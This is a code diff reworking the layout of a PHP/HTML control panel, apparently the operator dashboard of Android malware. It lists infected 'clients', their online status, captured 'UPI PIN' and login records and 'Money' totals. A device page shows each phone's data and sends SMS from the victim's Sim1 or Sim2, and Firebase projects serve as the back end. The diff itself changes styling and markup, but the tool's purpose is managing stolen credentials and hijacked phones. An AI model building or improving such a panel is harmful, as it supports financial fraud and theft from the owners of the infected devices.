@@ -47,7 +47,7 @@ header('Cache-Control: no-store, no-cache, must-revalidate');
 <html lang="en">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
 <meta name="theme-color" content="#adcf9f"/>
 <title>BrM — Nya Panel</title>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
@@ -56,147 +56,233 @@ header('Cache-Control: no-store, no-cache, must-revalidate');
 :root{
   --main:#adcf9f;--card:#d2edc6;--card-border:#546b4d;
   --black:#000;--pin:#9c27b0;--offline:#f00;--online:#005509;
-  --muted:#454545;--hint:#888;
+  --muted:#454545;--hint:#888;--detail:#ac0000;
 }
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{
-  height:100%;height:100dvh;width:100%;
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{height:auto;min-height:100%;-webkit-text-size-adjust:100%}
+body{
+  min-height:100%;width:100%;position:relative;
   font-family:sans-serif;background:var(--main);color:var(--black);
-  overflow:hidden;position:fixed;inset:0;
+  overflow-x:hidden;overflow-y:scroll;
+  -webkit-overflow-scrolling:touch;
+  touch-action:pan-y;
 }
-.hidden{display:none!important}
-.app{
-  height:100%;height:100dvh;width:100%;
-  display:flex;flex-direction:column;
-  background:var(--main);overflow:hidden;
-}
-.panel-view{
-  display:flex;flex-direction:column;
-  flex:1;min-height:0;width:100%;
-  overflow:hidden;
-}
-
-/* Header block — APK activity_main / onlypin */
-.hdr-block{background:var(--main);padding:12px 0 0;flex-shrink:0;position:relative}
-.hdr-row{display:flex;align-items:center;justify-content:space-between;padding:0 16px 8px}
+.page{display:none;width:100%;min-height:0;padding-bottom:max(24px,env(safe-area-inset-bottom))}
+.page.active{display:block}
+.hdr-block{background:var(--main);padding:12px 0 8px;position:sticky;top:0;z-index:30;box-shadow:0 2px 0 rgba(0,0,0,.06)}
+.hdr-row{display:flex;align-items:center;justify-content:space-between;padding:0 16px 8px;gap:8px}
 .hdr-title{font-size:20px;font-weight:800;text-align:center;flex:1}
 .hdr-title.big{font-size:25px;text-align:left;padding-left:16px}
-.icon-btn{background:none;border:none;width:40px;height:40px;cursor:pointer;font-size:22px;display:flex;align-items:center;justify-content:center}
+.icon-btn{background:none;border:none;min-width:40px;min-height:40px;cursor:pointer;font-size:22px;display:flex;align-items:center;justify-content:center;touch-action:manipulation}
 .upi-line{font-size:20px;font-weight:800;padding:0 16px 8px}
 .btn-row{display:flex;gap:8px;padding:8px;margin:0 8px}
-.btn-row .nya-btn{flex:1;height:44px;border:1px solid var(--black);border-radius:10px;background:var(--black);color:var(--main);font-size:12px;font-weight:700;cursor:pointer}
-.btn-row .nya-btn.active{outline:3px solid var(--black);outline-offset:2px}
+.btn-row .nya-btn{flex:1;min-height:44px;border:1px solid var(--black);border-radius:10px;background:var(--black);color:var(--main);font-size:12px;font-weight:700;cursor:pointer;touch-action:manipulation}
 .btn-row .nya-btn.wide{font-size:14px}
-.search-row{display:flex;align-items:center;padding:0 16px 16px;gap:8px}
-.search-box{flex:1;height:45px;border-radius:20px;border:1px solid var(--card);background:var(--card);padding:0 14px;font-size:16px;color:var(--black);outline:none}
+.search-row{display:flex;align-items:center;padding:0 16px 12px;gap:8px}
+.search-box{flex:1;min-height:45px;border-radius:20px;border:1px solid var(--card);background:var(--card);padding:0 14px;font-size:16px;color:var(--black);outline:none}
 .search-box::placeholder{color:var(--hint)}
+.list-wrap{width:100%;padding-bottom:max(24px,env(safe-area-inset-bottom))}
 
-/* Device list — scrollable area */
-.list-wrap{
-  flex:1;min-height:0;width:100%;
-  overflow-y:auto;overflow-x:hidden;
-  -webkit-overflow-scrolling:touch;
-  overscroll-behavior:contain;
-  touch-action:pan-y;
-  padding-bottom:max(20px,env(safe-area-inset-bottom));
-}
-
-/* card_list.xml exact */
-.dev-card{margin:5px 15px;border-radius:20px;background:var(--card-border);box-shadow:0 8px 24px rgba(0,0,0,.25);overflow:hidden;cursor:pointer}
-.dev-card-inner{background:var(--card);min-height:150px;padding:8px 12px;display:grid;grid-template-columns:60px 1fr auto;grid-template-rows:auto auto auto;gap:4px 10px;position:relative}
-.dev-count{font-size:15px;font-weight:800;grid-column:1;grid-row:1;align-self:start;margin-top:8px}
-.dev-like{width:60px;height:60px;grid-column:1;grid-row:2;display:flex;align-items:center;justify-content:center;font-size:36px}
+.dev-card{margin:5px 15px;border-radius:20px;background:var(--card-border);box-shadow:0 8px 24px rgba(0,0,0,.25);overflow:hidden;cursor:pointer;touch-action:manipulation}
+.dev-card-inner{background:var(--card);min-height:150px;padding:8px 12px;display:grid;grid-template-columns:60px 1fr auto;grid-template-rows:auto auto auto auto;gap:4px 10px}
+.dev-count{font-size:15px;font-weight:800;grid-column:1;grid-row:1;margin-top:8px}
+.dev-like{width:60px;height:60px;grid-column:1;grid-row:2;display:flex;align-items:center;justify-content:center;font-size:36px;touch-action:manipulation}
 .dev-like.liked{color:#e91e63}
 .dev-info{grid-column:2;grid-row:1/3;font-size:16px;font-weight:700;line-height:1.45;white-space:pre-line;padding-top:8px}
 .dev-status{grid-column:3;grid-row:1;font-size:20px;font-weight:800;text-shadow:1px 1px 2px rgba(0,0,0,.3)}
-.dev-status.offline{color:var(--offline)}
-.dev-status.online{color:var(--online)}
-.dev-del{grid-column:3;grid-row:2;font-size:24px;cursor:pointer;padding:4px;align-self:center}
-.dev-pin{grid-column:1/3;grid-row:3;font-size:18px;font-weight:800;color:var(--pin);text-shadow:1px 1px 2px rgba(0,0,0,.2)}
+.dev-status.offline{color:var(--offline)}.dev-status.online{color:var(--online)}
+.dev-del{grid-column:3;grid-row:2;font-size:24px;padding:4px;touch-action:manipulation}
+.dev-pin{grid-column:1/3;grid-row:3;font-size:18px;font-weight:800;color:var(--pin)}
 .dev-check{grid-column:3;grid-row:3;font-size:14px;font-weight:800;color:var(--pin);display:flex;align-items:center;gap:4px}
 .dev-check input{width:18px;height:18px;accent-color:var(--pin)}
-.dev-time{grid-column:2/4;grid-row:4;font-size:12px;font-weight:700;color:var(--muted);text-align:right;padding-top:2px}
+.dev-time{grid-column:2/4;grid-row:4;font-size:12px;font-weight:700;color:var(--muted);text-align:right}
 
 .empty{padding:40px 20px;text-align:center;font-weight:700;color:var(--muted)}
-.loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.5);display:none;align-items:center;justify-content:center;z-index:100}
-.loading-overlay.show{display:flex}
+.loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.5);display:none;align-items:center;justify-content:center;z-index:100;pointer-events:none}
+.loading-overlay.show{display:flex;pointer-events:auto}
 .spinner{width:60px;height:60px;border:5px solid var(--card-border);border-top-color:var(--black);border-radius:50%;animation:spin .8s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* Firebase sheet */
-.sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:50;opacity:0;pointer-events:none;transition:.2s}
+.sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:50;opacity:0;pointer-events:none}
 .sheet-bg.open{opacity:1;pointer-events:auto}
-.sheet{position:fixed;left:0;right:0;bottom:0;z-index:51;background:var(--card);border-radius:20px 20px 0 0;padding:16px;max-height:75vh;overflow-y:auto;transform:translateY(100%);transition:.28s}
+.sheet{position:fixed;left:0;right:0;bottom:0;z-index:51;background:var(--card);border-radius:20px 20px 0 0;padding:16px;max-height:75vh;overflow-y:auto;-webkit-overflow-scrolling:touch;transform:translateY(100%);transition:.28s}
 .sheet.open{transform:translateY(0)}
 .sheet h3{font-size:16px;margin-bottom:12px}
 .fb-item{padding:12px;border:1px solid var(--card-border);border-radius:12px;margin-bottom:8px;background:#fff;cursor:pointer}
 .fb-item.active{border-color:var(--black);background:var(--main)}
 .fb-item small{display:block;color:var(--muted);font-size:11px;margin-top:4px;word-break:break-all}
 .sheet input{width:100%;padding:12px;margin:6px 0;border-radius:12px;border:1px solid var(--card-border);font-size:14px}
-.sheet .nya-btn{width:100%;margin-top:8px;height:44px}
+.sheet .nya-btn{width:100%;margin-top:8px;min-height:44px;background:var(--black);color:var(--main);border-radius:10px;border:1px solid var(--black);font-weight:700}
 
-/* SMS modal */
-.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:60;display:none;align-items:flex-end;justify-content:center}
-.modal-bg.open{display:flex}
-.modal{width:100%;max-height:85vh;background:var(--main);border-radius:20px 20px 0 0;padding:16px;display:flex;flex-direction:column;overflow:hidden}
-#smsModalList{flex:1;min-height:0;overflow-y:auto;-webkit-overflow-scrolling:touch;overscroll-behavior:contain;touch-action:pan-y;padding-bottom:12px}
-.sms-card{margin:4px 5px;border-radius:20px;background:var(--card-border);box-shadow:0 4px 16px rgba(0,0,0,.15)}
+/* Device detail — activity_main2 */
+.detail-hdr{display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--main);position:sticky;top:0;z-index:31}
+.detail-hdr .back{font-size:28px;background:none;border:none;cursor:pointer;padding:4px}
+.detail-hdr .title{flex:1;font-size:24px;font-weight:800;text-align:center}
+.detail-hdr .status{font-size:20px;font-weight:800}
+.detail-hdr .status.offline{color:var(--offline)}
+.detail-line{height:2px;background:#a3a3a3;margin:0}
+.detail-body{padding:16px 24px;color:var(--detail);font-size:16px;font-weight:700;line-height:1.6;white-space:pre-line}
+.detail-actions{padding:0 16px 12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.detail-actions input,.detail-actions textarea{flex:1;min-width:140px;padding:10px;border:1px solid var(--black);border-radius:8px;font-size:15px}
+.detail-actions .nya-btn{min-height:40px;padding:0 16px;background:var(--black);color:var(--main);border-radius:8px;border:1px solid var(--black);font-weight:700;cursor:pointer}
+.sim-row{display:flex;gap:8px;padding:0 16px 8px}
+.sim-row .nya-btn{flex:1}
+
+.sms-card{margin:4px 8px;border-radius:20px;background:var(--card-border);box-shadow:0 4px 16px rgba(0,0,0,.15)}
 .sms-inner{background:var(--card);padding:10px 16px;display:flex;gap:10px;align-items:flex-start}
 .sms-icon{font-size:40px;flex-shrink:0}
 .sms-body{flex:1;font-size:14px;color:var(--black);word-break:break-word}
 .sms-meta{font-size:12px;font-weight:700;color:var(--muted);margin-top:6px}
-
 .toast-wrap{position:fixed;top:12px;left:12px;right:12px;z-index:200;pointer-events:none}
 .toast{padding:12px;border-radius:12px;background:#fff;border:1px solid var(--card-border);font-size:13px;margin-bottom:8px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
 </style>
 </head>
 <body>
-<div class="app">
 
-  <!-- HOME — activity_main.xml -->
-  <div id="view-home" class="panel-view">
-    <div class="hdr-block">
-      <div class="hdr-row">
-        <span style="width:40px"></span>
-        <div class="hdr-title" id="totalClients">Total Clients:-</div>
-        <button class="icon-btn" onclick="openFbSheet()" title="Firebase">🔥</button>
-      </div>
-      <div class="btn-row">
-        <button class="nya-btn" id="btnLiked" onclick="setFilter('liked',this)">Liked ❤️</button>
-        <button class="nya-btn" id="btnOnline" onclick="setFilter('online',this)">Online🟢</button>
-        <button class="nya-btn" id="btnOnlyPin" onclick="goOnlyPin()">Only PIN📍</button>
-      </div>
-      <div class="search-row">
-        <input class="search-box" id="searchHome" placeholder="Search clients..." oninput="renderDevices()"/>
-        <button class="icon-btn" onclick="refreshData()">🔄</button>
-      </div>
-      <div class="btn-row">
-        <button class="nya-btn wide" onclick="setFilter('money',this)">Money 💰</button>
-        <button class="nya-btn" onclick="setFilter('login',this)">Login👨🏻‍💻</button>
-        <button class="nya-btn" onclick="deleteChecked()">Delete🗑️</button>
-      </div>
+<!-- HOME activity_main -->
+<div id="view-home" class="page active">
+  <div class="hdr-block">
+    <div class="hdr-row">
+      <span style="width:40px"></span>
+      <div class="hdr-title" id="totalClients">Total Clients:-</div>
+      <button type="button" class="icon-btn" onclick="openFbSheet()" title="Firebase">🔥</button>
     </div>
-    <div class="list-wrap" id="devList"></div>
-  </div>
-
-  <!-- ONLY PIN — onlypin.xml -->
-  <div id="view-onlypin" class="panel-view hidden">
-    <div class="hdr-block" style="min-height:180px">
-      <div class="hdr-row">
-        <button class="nya-btn wide" style="width:150px;height:40px;margin-left:8px" onclick="goHome()">Home 🏡</button>
-        <span style="flex:1"></span>
-        <button class="icon-btn" onclick="refreshData()">🔄</button>
-      </div>
-      <div class="hdr-title big" id="panelTitle">Android Management XYZ</div>
-      <div class="upi-line" id="upiPinCount">UPI PIN:-</div>
-      <div class="search-row">
-        <input class="search-box" id="searchPin" placeholder="Search Only Pin clients..." oninput="renderDevices()"/>
-        <button class="icon-btn" onclick="renderDevices()">🔍</button>
-      </div>
+    <div class="btn-row">
+      <button type="button" class="nya-btn" onclick="showPage('liked')">Liked ❤️</button>
+      <button type="button" class="nya-btn" onclick="showPage('online')">Online🟢</button>
+      <button type="button" class="nya-btn" onclick="showPage('onlypin')">Only PIN📍</button>
     </div>
-    <div class="list-wrap" id="devListPin"></div>
+    <div class="search-row">
+      <input class="search-box" id="searchHome" placeholder="Search clients..." oninput="renderDevices()"/>
+      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
+    </div>
+    <div class="btn-row">
+      <button type="button" class="nya-btn wide" onclick="showPage('money')">Money 💰</button>
+      <button type="button" class="nya-btn" onclick="showPage('login')">Login👨🏻‍💻</button>
+      <button type="button" class="nya-btn" onclick="deleteChecked()">Delete🗑️</button>
+    </div>
   </div>
+  <div class="list-wrap" id="devList"></div>
+</div>
 
+<!-- ONLINE online.xml -->
+<div id="view-online" class="page">
+  <div class="hdr-block">
+    <div class="hdr-row">
+      <button type="button" class="nya-btn wide" style="width:150px" onclick="showPage('home')">Home 🏡</button>
+      <div class="hdr-title big" id="panelTitleOnline">Android Management XYZ</div>
+      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
+    </div>
+    <div class="upi-line" id="activeCount">Active🟢:-</div>
+    <div class="search-row">
+      <input class="search-box" id="searchOnline" placeholder="Search Online clients..." oninput="renderDevices()"/>
+      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
+    </div>
+  </div>
+  <div class="list-wrap" id="devListOnline"></div>
+</div>
+
+<!-- ONLY PIN onlypin.xml -->
+<div id="view-onlypin" class="page">
+  <div class="hdr-block">
+    <div class="hdr-row">
+      <button type="button" class="nya-btn wide" style="width:150px" onclick="showPage('home')">Home 🏡</button>
+      <div class="hdr-title big" id="panelTitlePin">Android Management XYZ</div>
+      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
+    </div>
+    <div class="upi-line" id="upiPinCount">UPI PIN:-</div>
+    <div class="search-row">
+      <input class="search-box" id="searchPin" placeholder="Search Only Pin clients..." oninput="renderDevices()"/>
+      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
+    </div>
+  </div>
+  <div class="list-wrap" id="devListPin"></div>
+</div>
+
+<!-- LIKED liked.xml -->
+<div id="view-liked" class="page">
+  <div class="hdr-block">
+    <div class="hdr-row">
+      <span style="font-size:36px;padding-left:8px">❤️</span>
+      <div class="hdr-title" id="likedCount">Liked Clients:-</div>
+      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
+    </div>
+    <div style="text-align:center;padding:8px">
+      <button type="button" class="nya-btn wide" style="width:150px;margin:0 auto" onclick="showPage('home')">Home 🏡</button>
+    </div>
+    <div class="search-row">
+      <input class="search-box" id="searchLiked" placeholder="Search Liked clients..." oninput="renderDevices()"/>
+      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
+    </div>
+  </div>
+  <div class="list-wrap" id="devListLiked"></div>
+</div>
+
+<!-- LOGIN logged.xml -->
+<div id="view-login" class="page">
+  <div class="hdr-block">
+    <div class="hdr-row">
+      <button type="button" class="nya-btn wide" style="width:150px" onclick="showPage('home')">Home 🏡</button>
+      <div class="hdr-title big" id="panelTitleLogin">Android Management XYZ</div>
+      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
+    </div>
+    <div class="upi-line" id="loggedCount">Logged in📲:-</div>
+    <div class="search-row">
+      <input class="search-box" id="searchLogin" placeholder="Search Logged-in clients..." oninput="renderDevices()"/>
+      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
+    </div>
+  </div>
+  <div class="list-wrap" id="devListLogin"></div>
+</div>
+
+<!-- MONEY money.xml -->
+<div id="view-money" class="page">
+  <div class="hdr-block">
+    <div class="hdr-row">
+      <button type="button" class="nya-btn wide" style="width:120px" onclick="showPage('home')">Home 🏡</button>
+      <div class="hdr-title" id="moneyTotal">Total:-</div>
+      <span style="width:40px"></span>
+    </div>
+    <div class="btn-row">
+      <button type="button" class="nya-btn" onclick="setMoneyFilter('amount')">Amount 💵</button>
+      <button type="button" class="nya-btn" onclick="setMoneyFilter('active')">Active 🟢</button>
+    </div>
+    <div class="search-row">
+      <input class="search-box" id="searchMoney" placeholder="Search liked clients..." oninput="renderMoneyView()"/>
+      <button type="button" class="icon-btn" onclick="renderMoneyView()">🔍</button>
+    </div>
+  </div>
+  <div class="list-wrap" id="devListMoney"></div>
+</div>
+
+<!-- DEVICE DETAIL activity_main2 -->
+<div id="view-device" class="page">
+  <div class="detail-hdr">
+    <button type="button" class="back" onclick="closeDeviceDetail()">←</button>
+    <div class="title" id="deviceDetailTitle">Device</div>
+    <div class="status offline" id="deviceDetailStatus">Offline</div>
+  </div>
+  <div class="detail-line"></div>
+  <div class="detail-body" id="deviceDetailBody">Loading…</div>
+  <div class="detail-actions">
+    <input id="updateMoney" placeholder="Update Money"/>
+    <button type="button" class="nya-btn" onclick="saveDeviceMoney()">Done</button>
+  </div>
+  <div class="detail-actions">
+    <input id="smsTo" placeholder="Enter recipient phone number" style="flex:2"/>
+  </div>
+  <div class="detail-actions">
+    <textarea id="smsBody" rows="2" placeholder="Enter SMS body" style="width:100%"></textarea>
+  </div>
+  <div class="sim-row">
+    <button type="button" class="nya-btn" onclick="sendDeviceSms(1)">Sim1</button>
+    <button type="button" class="nya-btn" onclick="sendDeviceSms(2)">Sim2</button>
+  </div>
+  <div class="search-row">
+    <input class="search-box" id="searchDevice" placeholder="Search clients..." oninput="renderDeviceSmsList()"/>
+    <button type="button" class="icon-btn" onclick="renderDeviceSmsList()">🔍</button>
+  </div>
+  <div class="list-wrap" id="devListDeviceSms"></div>
 </div>
 
 <div class="loading-overlay" id="loading"><div class="spinner"></div></div>
@@ -209,14 +295,7 @@ html,body{
   <input id="fbAddName" placeholder="Project name"/>
   <input id="fbAddUrl" placeholder="https://xxx.firebaseio.com"/>
   <input id="fbAddApiKey" placeholder="API key (optional)"/>
-  <button class="nya-btn wide" type="button" onclick="addFirebaseProject()">+ Add Firebase</button>
-</div>
-
-<div class="modal-bg" id="smsModal" onclick="closeSmsModal(event)">
-  <div class="modal" onclick="event.stopPropagation()">
-    <div class="hdr-row"><strong id="smsModalTitle">SMS</strong><button class="icon-btn" onclick="closeSmsModal()">✕</button></div>
-    <div id="smsModalList"></div>
-  </div>
+  <button type="button" class="nya-btn wide" onclick="addFirebaseProject()">+ Add Firebase</button>
 </div>
 
 <script>var SERVER_FIREBASES=<?php echo json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;</script>
